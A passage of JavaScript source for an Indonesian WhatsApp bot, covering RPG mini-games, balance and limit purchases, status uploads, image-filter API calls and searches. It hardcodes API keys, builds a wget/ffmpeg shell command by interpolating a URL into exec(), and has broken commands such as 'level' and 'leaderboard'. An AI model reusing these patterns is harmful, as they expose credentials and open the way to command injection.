var pp = await itsmevall.getProfilePicture(idk)
buffer = await getBuffer(pp)
itsmevall.updateProfilePicture(botNumber, buffer)
mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
} catch (e) {
reply('Emror')
}
break
case 'blurple':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  itsmevall.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/blurple?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					itsmevall.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break
				 case 'rpgmenu':
				 if (isBanned) return reply(mess.ban)
checkHealt(sender)
break
				 case 'joinrpg':
				 if (isBanned) return reply(mess.ban)
          if (!isGroup) return reply(mess.only.group)  
		  if (isPetualang) return reply('Kamu sudah menjadi petualang')
	   	  _petualang.push(sender)
		  fs.writeFileSync('./lib/inventori.json', JSON.stringify(_petualang))
		  capt = `🎉Selamat ${pushname}🎊\nKamu terdaftar sebagai petualang!\nSilahkan ketik ${prefix}rpgmenu`
		  itsmevall.sendMessage(from, capt, text, {quoted: mek})		
		  addInventori(sender)
	      addLevelingId(sender)
		  break
case 'addvn':
if (isBanned) return reply(mess.ban)
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					if (!isQuotedAudio) return reply('Reply audio')
					nm = body.slice(7)
					if (!nm) return reply('Nama vn nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await itsmevall.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./media/vn/${nm}.mp3`, delb)
					fs.writeFileSync('./database/vien.json', JSON.stringify(vien))
					itsmevall.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./media/vn/${nmm}.mp3`)
					reply(`Sukses menghapus vn ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'bal': case 'limit': case 'ceklimit': case 'balance': case 'glimit':
if (isBanned) return reply(mess.ban)
reply(`*${ucapanWaktu} @${sender.split("@")[0]}*✨

Limit : *${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitCount, limit)}`}*
Balance : *$${getBalance(sender, balance)}*


Kamu Dapat Membeli Limit Dengan ${prefix}Buylimit *Nominal* Dan ${prefix}Buyglimit *Nominal* Untuk Membeli Game Limit

*EXAMPLE :*
${prefix}buylimit 10
${prefix}buyglimit 10

NOTE : 
- Harga Limit Perlimit adalah $100 balance`)
break
case 'leaderboard':
				case 'lb':
				if (isBanned) return reply(mess.ban)
		//if (!isRegistered) return reply(ind.noregis())
		//f (isBanned) return reply(ind.baned())
				if (!isGroup) return reply('Fitur ini hanya isa di gunakan di grup')
				_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
				//uang.sort((a, b) => (a.uang < b.uang) ? 1 : -1)
                let leaderboardlvl = ' > 𝗧𝗢𝗣 𝗟𝗘𝗔𝗗𝗘𝗥𝗕𝗢𝗔𝗥𝗗 <\n\n'
               // let leaderboarduang = '-----[ *LEADERBOARD UANG* ]----\n\n'
                let nom = 0
                try {
                    for (let i = 0; i < 10; i++) {
                        nom++
                        leaderboardlvl += `*[${nom}]* wa.me/${_level[i].replace('@s.whatsapp.net', '')}\n • *XP*: ${_level[i].xp} *Level*: ${_level[i].level}\n`
                        //leaderboarduang += `*[${nom}]* wa.me/${uang[i].id.replace('@s.whatsapp.net', '')}\n┣⊱ *Uang*: _Rp${uang[i].uang}_\n┗⊱ *Limit*: ${limitawal - _limit[i].limit}\n`
                    }
                    await reply(leaderboardlvl)
                    //await reply(leaderboarduang)
                } catch (err) {
                    console.error(err)
                    await reply(`minimal 10 user untuk bisa mengakses database`)
                }
                break
case 'mancing':
if (isBanned) return reply(mess.ban)
         if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)      
if (isBanned) return reply(mess.ban)        
          ikannya = ikan[Math.floor(Math.random() * ikan.length)]
	      xp = Math.ceil(Math.random() * 350)          
	      coin = randomNomor(50)	    
	      ditangkap = Math.ceil(Math.random() * 50)
	      cing = await getBuffer(`https://telegra.ph/file/d9b15de4f661808dfd0b9.jpg`)
	      setTimeout( () => {
	      caption = monospace(`「 Memancing 」\n\n • Tangkapan : ${ikannya}\n • Total Dapat : ${ditangkap} Ikan\n • MONEY : $${coin}\n • EXP : ${xp}Xp`)
          but = [
          { buttonId: 'mancing', buttonText: { displayText: 'Mancing lagi' }, type: 1 },
          { buttonId: 'myinventori', buttonText: { displayText: 'Cek Inventori' }, type: 1 }
           ]
          sendButLocation(from, caption, 'Memancing', {jpegThumbnail:cing}, but, {quoted: mek})      
          }, 6000)
          setTimeout( () => {
		  itsmevall.sendMessage(from, 'Berhasil Mendapatkan Ikan. . .', text) 
		  }, 5000) // 1000 = 1s,
	      setTimeout( () => {
		  itsmevall.sendMessage(from, '🎣Meanarik kail. . .', text) 
		  }, 3000) // 1000 = 1s,
		  setTimeout( () => {
		  itsmevall.sendMessage(from, '🎣Mulai memancing. . .', text) 
		  }, 1500) // 1000 = 1s,
		  addLevelingLevel(sender, ditangkap)
		  addLevelingXp(sender, xp)
		  addBalance(sender, coin, balance) 
          limitAdd(sender, limit)         
	      break
	      case 'cekinven': case 'myinventori':
	      if (isBanned) return reply(mess.ban)
var reqXp  = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
done = monospace(`📍 𝗣𝗿𝗼𝗳𝗶𝗹𝗲 𝗣𝗹𝗮𝘆𝗲𝗿\n • Nama : ${pushname}\n • Rank : ${role}\n • Status : Gratisan\n • Xp : ${xp}Xp/${reqXp}\n • Level : ${getLevelingLevel(sender)}\n🎒 𝗜𝗻𝘃𝗲𝗻𝘁𝗼𝗿𝗶 :\n • Emas : ${getEmas(sender)}🪙\n • Uang : $${(getBalance(sender, balance))}💰\n • Besi : ${getBesi(sender)}⛓️\n • Berlian : ${getDm(sender)}💎\n • Ikan : ${getFish(sender)}🎣`)
but = [{ buttonId: `adventure`, buttonText: { displayText: 'Adventure' }, type: 1 }]
          sendButMessage(from, done, 'Inventori User', but)
break
case 'adventure':
          if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)      
if (isBanned) return reply(mess.ban)
          if (!isPetualang) return reply(mess.only.player)		
	      ngab = ['Longsor','Letusan Gunung','Tsunami','Gempa Bumi','Meteor','Demon']
	      const sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
          const dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
	      const ad = dungeon[Math.floor(Math.random() * dungeon.length)]
	      anu = fs.readFileSync('./lib/dungeon.js');
          jsonData = JSON.parse(anu);
	      randIndex = Math.floor(Math.random() * jsonData.length);
          randKey = jsonData[randIndex];
	      hasm = await getBuffer(randKey.result)  
	      const adven = Math.ceil(Math.random() * 1000)          
	      const money = Math.ceil(Math.random() * 300)					      	      
	      setTimeout( () => {		
          caption = monospace(`「 DEATH 」\n\n • Tempat  ${ad}\n • MONEY : $${money}\n • EXP : ${adven}Xp`)
          but = [
          { buttonId: `myinventori`, buttonText: { displayText: 'Inventori' }, type: 1 }]
          sendButLocation(from, caption, 'Memancing', {jpegThumbnail:hasm}, but, {quoted: mek})   
          }, 7000)
          setTimeout( () => {
		  itsmevall.sendMessage(from, `Awass`, text) 
		  }, 5000) // 1000 = 1s,
	      setTimeout( () => {
		  itsmevall.sendMessage(from, `Tiba tiba ada ${sesuatu}`, text) 
		  }, 3000) // 1000 = 1s,
		  setTimeout( () => {
		  itsmevall.sendMessage(from, `${pushname} sedang bertualang`, text) 
		  }, 1500) // 1000 = 1s,
		  addLevelingXp(sender, adven)
		  addBalance(sender, money, balance) 
          limitAdd(sender, limit) 
        //  await healtAdd(sender)
          break
case 'mining':   
   	      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)      
if (isBanned) return reply(mess.ban)
   	      if (!isGroup) return reply(mess.only.group)                                  
          pp = randomNomor(75)
          emas = randomNomor(15)
          dm = randomNomor(3)
          besi = randomNomor(50)
          done = monospace(`Selesai Mining🚧\nlist hasil :\nEmas : ${emas}🪙\nUang : $${pp}💰\nBesi : ${besi}⛓️\nBerlian : ${dm}💎`)
          addBalance(sender, pp, balance)          
          addBesi(sender, besi)
          addEmas(sender, emas)
          addDm(sender, dm)
          mining = ('Waitt sedang menguli . . .')
		  setTimeout( () => {		//case by pebri
		  but = [{ buttonId: `mining`, buttonText: { displayText: 'Mining again' }, type: 1 }]
          sendButMessage(from, done, 'Mining', but)
		  }, 9000) // 1000 = 1s,
		  setTimeout( () => {
		  itsmevall.sendMessage(from, '🚧 selesai menguli. . .🪙👷', text) 
		  }, 7000) // 1000 = 1s,
	      setTimeout( () => {
		  itsmevall.sendMessage(from, '🚧 menemukan emas. . .⚒️🏔️️️', text) 
		  }, 4000) // 1000 = 1s,
		  setTimeout( () => {
		  itsmevall.sendMessage(from, '🚧 mulai menambang. . .⚒️🏔️️', text) 
		  }, 1500) // 1000 = 1s,
		  setTimeout( () => {
		  itsmevall.sendMessage(from, mining, text, {quoted: mek}) 
		  }, 0) // 1000 = 1s,
		  limitAdd(sender, limit)
	      break	 
					case 'xp':
					case 'level':
					if (isBanned) return reply(mess.ban)
					if (!isGroup) return reply(mess.only.group)
              if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!')
              let userLevel = level.getLevelingLevel(sender, _level)
              let userXp = level.getLevelingXp(sender, _level)
              let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
              let userRank = level.getUserRank(sender, _level)
              try {
              profilePic = await itsmevall.getProfilePicture(sender)
              } catch {
              profilePic = errorImg
}
              ikyads = await getBuffer(`http://hardianto.xyz/api/rankcard?profile=${profilePic}&name=${encodeURI(pushname)}&bg=https://bit.ly/walpamikel&needxp=${requiredXp}&curxp=${userXp}&level=${userLevel}&logorank=https://i.ibb.co/vHYR7pV/20210930-090929.png`)
              teks = `*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Role*: *${role}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`
              itsmevall.sendMessage(from, buffer, image, { caption: teks, quoted: freply})
              break
              case 'buylimit':
              if (isBanned) return reply(mess.ban)
              if (!q) return reply("harus berunpa angka?");
              if (args.length < 1) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $25 balance`)                               
                let ane = Number(nebal(args[1]) * 25)
                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                kurangBalance(sender, ane, balance)
                giveLimit(sender, nebal(args[1]), limit)
                reply(monospace(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))            
                break
                case 'buy':
          if (args.length < 1) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $150 balance`)      
          payout = body.slice(10)
          lol = 150 * payout
          if (getBalance(sender, balance) < lol) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
          kurangBalance(sender, lol, balance)
          giveLimit(sender, parseInt(args[0]), limit)
          reply(monospace(`Pembeliaan limit sebanyak ${args[0]} berhasil\n\nSisa Balance :  $${(getBalance(sender, balance))}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
          break
                case 'claim':
                        return reply(`Anda sudah mengklaim dan mendapatkan 1000 💵money dan 1 potion`)                
                    break
				case 'vnlist':
				case 'listvn':
				if (isBanned) return reply(mess.ban)
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					teks = '*VN List :*\n\n'
					for (let awokwkwk of vien) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${vien.length}*\n\n_Untuk mengambil vn silahkan reply pesan ini dengan caption nama vn_`
					itsmevall.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": vien } })
					break
case 'script':
		case 'sc':
		case 'sourcecode':	
		if (isBanned) return reply(mess.ban)
		return fakegroup('Bot Ini Menggunakan Script : https://github.com/Fauzibanh')
		break
      //------------------< Sticker Cmd >-------------------
      case "addcmd":
      case "setcmd":
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        if (isQuotedSticker) {
          if (!q)
            return grupinv(`Penggunaan : ${command} cmdnya dan tag stickernya`);
          var kodenya =
            mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
              "base64"
            );
          addCmd(kodenya, q);
          fakestatus("Done!");
        } else {
          grupinv("tag stickenya");
        }
        break;
        case 'google':
        case 'ggs':
        case 'googlesearch':
                    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                    if (isBanned) return reply(mess.ban)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.zacros.my.id/search/google?query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Penerangan : ${x.snippet}\n`                        
                        ini_txt += `Link : ${x.link}\n`                        
                    }
                    reply(ini_txt)
                    limitAdd(sender, limit)
                    break
                    case 'newsinfo':
                    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                    if (isBanned) return reply(mess.ban)                    
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `*INFONEWS* : ${x.judul}\n`
                        ini_txt += `*POSTER* : ${x.poster}\n`                        
                        ini_txt += `Link : ${x.link}\n`                        
                    }
                    reply(ini_txt)
                    limitAdd(sender, limit)
                    break
        case 'image':
       case 'gimage':
       case 'googleimage':
       if (isBanned) return reply(mess.ban)
              if (args.length < 1) return reply('Apa Yang Mau Dicari?')
              reply(mess.wait)
              teks = args.join(' ')
              res = await googleImage(teks, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] Error Terjadi Kesalahan Atau Hasil Tidak Ditemukan_')}
              else {
              gugIm = result
              random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: mek, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
             break                                   
case 'ppcp':
if (isBanned) return reply(mess.ban)
            reply(mess.wait)
			anu = await fetchJson(`https://ziyy.herokuapp.com/api/ppcouple?apikey=xZiyy`) 
			cowo = await getBuffer(anu.result.cowo_image)
			itsmevall.sendMessage(from, cowo, image, {caption: 'Ini Untuk »  *COWOK*'})
       cewe = await getBuffer(anu.result.cewe_image)
		    pll = `Ini Untuk » *CEWEK*`
   sendButImage(from, pll, `By REALZIBOT`, cewe, [                      
          {
            buttonId: `${prefix}ppcouple`,
            buttonText: {
              displayText: `Next︎`,
            },
            type: 1,
          },
        ]);                 
                    break
case 'wanted':  
  if (isBanned) return reply(mess.ban)
  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit Lo Abis Tot`)
  if (!q) return reply('Penggunaan /wanted : Contoh, /wanted https://telegra.ph/file/31a2ddd6c83c04456a6d1.png')
  reply(mess.wait)  
  uhyy = await getBuffer(`https://api-alphabot.herokuapp.com/api/image_editor/wanted?apikey=Alphabot&url=${q}`)
  itsmevall.sendMessage(from, uhyy, image, {thumbnail:uhyy, quoted: mek})
  reply('Sending Images')
limitAdd(sender, limit)
  break
case 'triggered':  
  if (isBanned) return reply(mess.ban)
  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit Lo Abis Tot`)
  if (!q) return reply('Penggunaan /triggered : Contoh, /triggered https://telegra.ph/file/31a2ddd6c83c04456a6d1.png')
  reply(mess.wait)  
  uhyy = await getBuffer(`https://api-alphabot.herokuapp.com/api/image_editor/triggered?apikey=Alphabot&url=${q}`)
  itsmevall.sendMessage(from, uhyy, image, {thumbnail:uhyy, quoted: mek})
  reply('Sending Images')
limitAdd(sender, limit)
  break
  case 'rip':  
  if (isBanned) return reply(mess.ban)
  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit Lo Abis Tot`)
  if (!q) return reply('Penggunaan /rip : Contoh, /rip https://telegra.ph/file/31a2ddd6c83c04456a6d1.png')
  reply(mess.wait)  
  uhyy = await getBuffer(`https://api-alphabot.herokuapp.com/api/image_editor/rip?apikey=Alphabot&url=${q}`)
  itsmevall.sendMessage(from, uhyy, image, {thumbnail:uhyy, quoted: mek})
  reply('Sending Images')
limitAdd(sender, limit)
  break
  case 'burn':  
  if (isBanned) return reply(mess.ban)
  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit Lo Abis Tot`)
  if (!q) return reply('Penggunaan /burn : Contoh, /burn https://telegra.ph/file/31a2ddd6c83c04456a6d1.png')
  reply(mess.wait)  
  uhyy = await getBuffer(`https://api-alphabot.herokuapp.com/api/image_editor/burn?apikey=Alphabot&url=${q}`)
  itsmevall.sendMessage(from, uhyy, image, {thumbnail:uhyy, quoted: mek})
  reply('Sending Images')
limitAdd(sender, limit)
  break
  case 'gay':  
  if (isBanned) return reply(mess.ban)
  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit Lo Abis Tot`)
  if (!q) return reply('Penggunaan /gay : Contoh, /gay https://telegra.ph/file/31a2ddd6c83c04456a6d1.png')
  reply(mess.wait)  
  uhyy = await getBuffer(`https://api-alphabot.herokuapp.com/api/image_editor/gay?apikey=Alphabot&url=${q}`)
  itsmevall.sendMessage(from, uhyy, image, {thumbnail:uhyy, quoted: mek})
  reply('Sending Images')
limitAdd(sender, limit)
  break
  case 'instagramefect':  
  if (isBanned) return reply(mess.ban)
  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit Lo Abis Tot`)
  if (!q) return reply('Penggunaan /instagramefect : Contoh, /instagramefect https://telegra.ph/file/31a2ddd6c83c04456a6d1.png')
  reply(mess.wait)  
  uhyy = await getBuffer(`https://api-alphabot.herokuapp.com/api/image_editor/instagram?apikey=Alphabot&url=${q}`)
  itsmevall.sendMessage(from, uhyy, image, {thumbnail:uhyy, quoted: mek})
  reply('Sending Images')
limitAdd(sender, limit)
  break
  case 'scary':  
  if (isBanned) return reply(mess.ban)
  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit Lo Abis Tot`)
  if (!q) return reply('Penggunaan /scary : Contoh, /scary https://telegra.ph/file/31a2ddd6c83c04456a6d1.png')
  reply(mess.wait)  
  uhyy = await getBuffer(`https://api-alphabot.herokuapp.com/api/image_editor/scary?apikey=Alphabot&url=${q}`)
  itsmevall.sendMessage(from, uhyy, image, {thumbnail:uhyy, quoted: mek})
  reply('Sending Images')
limitAdd(sender, limit)
  break
  case 'fire':  
  if (isBanned) return reply(mess.ban)
  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit Lo Abis Tot`)
  if (!q) return reply('Penggunaan /fire : Contoh, /fire https://telegra.ph/file/31a2ddd6c83c04456a6d1.png')
  reply(mess.wait)  
  uhyy = await getBuffer(`https://api-alphabot.herokuapp.com/api/image_editor/fire?apikey=Alphabot&url=${q}`)
  itsmevall.sendMessage(from, uhyy, image, {thumbnail:uhyy, quoted: mek})
  reply('Sending Images')
limitAdd(sender, limit)
  break
  case 'redple':  
  if (isBanned) return reply(mess.ban)
  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit Lo Abis Tot`)
  if (!q) return reply('Penggunaan /redple : Contoh, /redple https://telegra.ph/file/31a2ddd6c83c04456a6d1.png')
  reply(mess.wait)  
  uhyy = await getBuffer(`https://api-alphabot.herokuapp.com/api/image_editor/redple?apikey=Alphabot&url=${q}`)
  itsmevall.sendMessage(from, uhyy, image, {thumbnail:uhyy, quoted: mek})
  reply('Sending Images')
limitAdd(sender, limit)
  break
	case 'upswteks':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return grupinv('Teksnya?')
                    teks = body.slice(10)
                    itsmevall.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
  if (args.length < 1) return grupinv('Teksnya?')
                    teks = body.slice(12)
                    itsmevall.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${fakeyoi}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedSticker) return grupinv('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)
						itsmevall.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedAudio) return grupinv('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)
						itsmevall.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedAudio) return grupinv('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)
						itsmevall.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
case 'upswvideo':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await itsmevall.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    itsmevall.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                           case 'upswgif':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await itsmevall.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    itsmevall.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await itsmevall.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    itsmevall.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break                        
            case 'ssweb':
            case 'ss':
                if (isBanned) return reply(mess.ban)
                if (args.length < 1) return reply('Urlnya mana om')
                reply(mess.wait)
					teks = q
					anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
					buff = await getBuffer(anu.screenshot)
					buttons = [{buttonId: `mks`,buttonText:{displayText: `Makasih☺️`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Jangan lupa donasi kak︎', imageMessage: imageMsg,
              contentText:`𝙅𝙖𝙣𝙜𝙖𝙣 𝙇𝙪𝙥𝙖 𝙁𝙤𝙡𝙡𝙤𝙬 𝙄𝙜 @spnx.fauzi`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              itsmevall.relayWAMessage(prep)
                    break;
                    case 'mks':
                    return reply('Sama Sama Kak:V')
                    break
					case 'mimpi':
				if (isBanned) return reply(mess.ban)	
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/artimimpi?q=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
case 'halloween':
	if (!arg) return reply(from, `Penggunaan ${prefix}halloween teks`, mek)
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${arg}&apikey=${HunterApi}`)
   break
   case 'vampire':
   if (!arg) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${arg}&apikey=${HunterApi}`)
   break
   case 'codetxt':
   if (!arg) return reply(from, `Penggunaan ${prefix}codetxt teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${arg}&apikey=${HunterApi}`)
   break
case 'matrix':
				if (!arg) return reply(from, `Penggunaan ${prefix}matrix teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${arg}&apikey=${HunterApi}`)
				break
				case 'googletxt':
